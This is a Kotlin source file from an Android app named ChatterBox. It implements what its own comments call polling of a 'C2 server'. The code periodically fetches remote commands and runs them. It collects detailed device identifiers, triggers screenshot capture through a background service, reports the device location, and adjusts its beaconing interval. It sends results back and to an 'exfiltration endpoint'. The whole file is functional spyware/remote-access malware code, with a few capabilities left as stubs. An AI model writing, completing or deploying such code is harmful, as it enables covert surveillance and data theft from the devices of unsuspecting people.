package com.example.ChatterBox.database

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.Executors

/**
 * Handles periodic polling for commands from the C2 server
 */
class Commands(private val context: Context) {
    private val TAG = "CommandPoller"
    private var timer: Timer? = null
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newSingleThreadExecutor()

    // Default poll interval (can be updated by server)
    private var pollInterval = 5 * 60 * 1000L // 5 minutes

    // Use consistent device ID throughout the app
    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    // Command handlers map
    private val commandHandlers = mapOf<String, (JSONObject) -> Unit>(
        "collect_info" to ::handleCollectInfoCommand,
        "capture_screenshot" to ::handleCaptureScreenshotCommand,
        "capture_camera" to ::handleCaptureCameraCommand,
        "get_location" to ::handleGetLocationCommand,
        "set_interval" to ::handleSetIntervalCommand,
        "custom_command" to ::handleCustomCommand
    )

    /**
     * Start polling for commands
     */
    fun startPolling() {
        stopPolling() // Ensure no duplicate timers

        timer = Timer()
        timer?.schedule(object : TimerTask() {
            override fun run() {
                pollForCommands()
            }
        }, 60000, pollInterval) // Start after 1 minute, then use poll interval

        Log.d(TAG, "Command polling started with interval: ${pollInterval/1000} seconds")
    }

    /**
     * Stop polling for commands
     */
    fun stopPolling() {
        timer?.cancel()
        timer = null
    }

    /**
     * Poll the C2 server for pending commands
     */
    private fun pollForCommands() {
        executor.execute {
            try {
                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}command")
                val connection = url.openConnection() as HttpURLConnection

                // Standard connection setup
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true

                // Request payload
                val requestData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("timestamp", System.currentTimeMillis())
                }

                // Send request
                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(requestData.toString())
                    writer.flush()
                }

                // Process response
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Parse response
                    val response = connection.inputStream.bufferedReader().use { it.readText() }
                    val responseJson = JSONObject(response)

                    if (responseJson.optString("status") == "success") {
                        // Process commands
                        val commands = responseJson.optJSONArray("commands")
                        if (commands != null && commands.length() > 0) {
                            Log.d(TAG, "Received ${commands.length()} commands")

                            // Process each command on main thread
                            handler.post {
                                for (i in 0 until commands.length()) {
                                    val commandObj = commands.optJSONObject(i)
                                    if (commandObj != null) {
                                        processCommand(commandObj)
                                    }
                                }
                            }
                        }
                    }
                }

                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error polling for commands: ${e.message}")
            }
        }
    }

    /**
     * Process a command from the server
     */
    private fun processCommand(commandObj: JSONObject) {
        try {
            val commandId = commandObj.optString("id")
            val commandType = commandObj.optString("command")

            Log.d(TAG, "Processing command: $commandType, ID: $commandId")

            // Find appropriate handler
            val handler = commandHandlers[commandType]
            if (handler != null) {
                // Execute command handler
                handler(commandObj)

                // Send command response
                sendCommandResponse(commandId, true, "Command executed successfully")
            } else {
                Log.w(TAG, "Unknown command type: $commandType")
                sendCommandResponse(commandId, false, "Unknown command type")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing command: ${e.message}")
        }
    }

    /**
     * Send command execution response to server
     */
    private fun sendCommandResponse(commandId: String, success: Boolean, message: String, result: JSONObject? = null) {
        executor.execute {
            try {
                val responseData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("command_id", commandId)
                    put("success", success)
                    put("message", message)
                    put("timestamp", System.currentTimeMillis())
                    if (result != null) {
                        put("result", result)
                    }
                }

                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}command_response")
                val connection = url.openConnection() as HttpURLConnection

                // Standard connection setup
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true

                // Send response
                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(responseData.toString())
                    writer.flush()
                }

                // Check result
                val responseCode = connection.responseCode
                Log.d(TAG, "Command response sent, status: $responseCode")

                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error sending command response: ${e.message}")
            }
        }
    }

    /**
     * Handle "collect_info" command
     */
    private fun handleCollectInfoCommand(command: JSONObject) {
        try {
            // Create device info payload
            val deviceInfo = JSONObject().apply {
                put("device_model", android.os.Build.MODEL)
                put("manufacturer", android.os.Build.MANUFACTURER)
                put("android_version", android.os.Build.VERSION.RELEASE)
                put("sdk_level", android.os.Build.VERSION.SDK_INT)
                put("device_id", deviceId)
                put("timestamp", System.currentTimeMillis())
                put("has_accessibility", com.example.ChatterBox.accessibility.AccessibilityHelper.isAccessibilityServiceEnabled(context))

                // Add additional device info
                put("board", android.os.Build.BOARD)
                put("brand", android.os.Build.BRAND)
                put("device", android.os.Build.DEVICE)
                put("display", android.os.Build.DISPLAY)
                put("fingerprint", android.os.Build.FINGERPRINT)
                put("hardware", android.os.Build.HARDWARE)
                put("host", android.os.Build.HOST)
                put("id", android.os.Build.ID)
                put("product", android.os.Build.PRODUCT)
                put("tags", android.os.Build.TAGS)
                put("type", android.os.Build.TYPE)
                put("user", android.os.Build.USER)
            }

            // Send response with device info
            sendCommandResponse(command.optString("id"), true, "Device info collected", deviceInfo)

            // Also send to exfiltration endpoint
            val dataSynchronizer = DataSynchronizer(context)
            dataSynchronizer.sendExfiltrationData("device_info", deviceInfo.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Error executing collect_info command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    /**
     * Handle "capture_screenshot" command
     */
    private fun handleCaptureScreenshotCommand(command: JSONObject) {
        try {
            // For now, just send a mock response
            // A real implementation would use MediaProjection to capture the screen
            val result = JSONObject().apply {
                put("message", "Screenshot capability requires MediaProjection permission")
                put("status", "pending")
            }

            // Send initial response
            sendCommandResponse(command.optString("id"), true, "Screenshot requested", result)

            // Start a background service to capture the screen
            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
            intent.action = "CAPTURE_SCREENSHOT"
            intent.putExtra("command_id", command.optString("id"))
            context.startService(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Error executing capture_screenshot command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    /**
     * Handle "capture_camera" command
     */
    private fun handleCaptureCameraCommand(command: JSONObject) {
        try {
            // For now, just send a mock response
            // A real implementation would use Camera2 API to capture from camera
            val result = JSONObject().apply {
                put("message", "Camera capture will be implemented in future release")
                put("status", "unsupported")
            }

            sendCommandResponse(command.optString("id"), false, "Camera capture not implemented", result)
        } catch (e: Exception) {
            Log.e(TAG, "Error executing capture_camera command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    /**
     * Handle "get_location" command
     */
    private fun handleGetLocationCommand(command: JSONObject) {
        try {
            // Get location using LocationTracker
            val locationTracker = LocationTracker.getInstance(context)
            locationTracker.captureLastKnownLocation { locationData ->
                try {
                    // Send response with location data
                    sendCommandResponse(command.optString("id"), true, "Location captured", locationData)
                } catch (e: Exception) {
                    Log.e(TAG, "Error sending location response: ${e.message}")
                    sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing get_location command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    /**
     * Handle "set_interval" command
     */
    private fun handleSetIntervalCommand(command: JSONObject) {
        try {
            // Get interval in minutes
            val intervalMinutes = command.optInt("interval", 5)
            pollInterval = intervalMinutes * 60 * 1000L

            // Restart polling with new interval
            startPolling()

            // Send success response
            val result = JSONObject().apply {
                put("new_interval", intervalMinutes)
                put("status", "updated")
            }

            sendCommandResponse(command.optString("id"), true, "Poll interval updated", result)
        } catch (e: Exception) {
            Log.e(TAG, "Error executing set_interval command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    /**
     * Handle "custom_command" command
     */
    private fun handleCustomCommand(command: JSONObject) {
        try {
            // Get command details
            val actionType = command.optString("action_type")
            val actionData = command.optJSONObject("action_data")

            // For now, just acknowledge receipt
            val result = JSONObject().apply {
                put("action_type", actionType)
                put("status", "acknowledged")
                put("message", "Custom command acknowledged")
            }

            sendCommandResponse(command.optString("id"), true, "Custom command acknowledged", result)
        } catch (e: Exception) {
            Log.e(TAG, "Error executing custom command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    /**
     * Get app version
     */
    private fun getAppVersion(): String {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
    }
}